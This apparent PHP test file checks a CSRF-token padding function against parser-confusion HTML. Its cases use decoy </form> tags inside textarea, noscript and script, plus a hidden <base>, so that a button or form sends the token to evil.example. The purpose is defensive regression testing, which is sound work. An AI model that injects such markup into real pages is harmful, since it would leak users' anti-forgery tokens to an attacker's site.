<?php

  // What the walk of the tags cannot settle as a browser does is settled closed: a decoy
  // </form> in a <textarea> past an <svg>, in a <noscript>, after <!-- in a script ended
  // the form for the walk, and the button after it - inside the form for a browser - posted
  // the token to another site; a <base> in a <noscript> hid the one that sends elsewhere.

  $cases = [
    '<form method="post"><script><!--<script></script></form></script><button formaction="https://evil.example/">x</button></form>',
    '<form method="post"><svg><foreignObject><textarea></form></textarea></foreignObject></svg><button formaction="https://evil.example/">x</button></form>',
    '<form method="post"><noscript></form></noscript><button formaction="https://evil.example/">x</button></form>',
    '<noscript><base href="/ok/"></noscript><base href="https://evil.example/"><form method="post" action="save"><input name="a"></form>',
    '<form method="post" action="?save"><input name="a"><button formaction="?other">x</button></form>',
  ];

  $verdicts = implode ( ' ', array_map ( fn ( $html ) => str_contains ( padCsrfForms ( $html ), 'padCsrfToken' ) ? 'token' : 'none', $cases ) );

?>
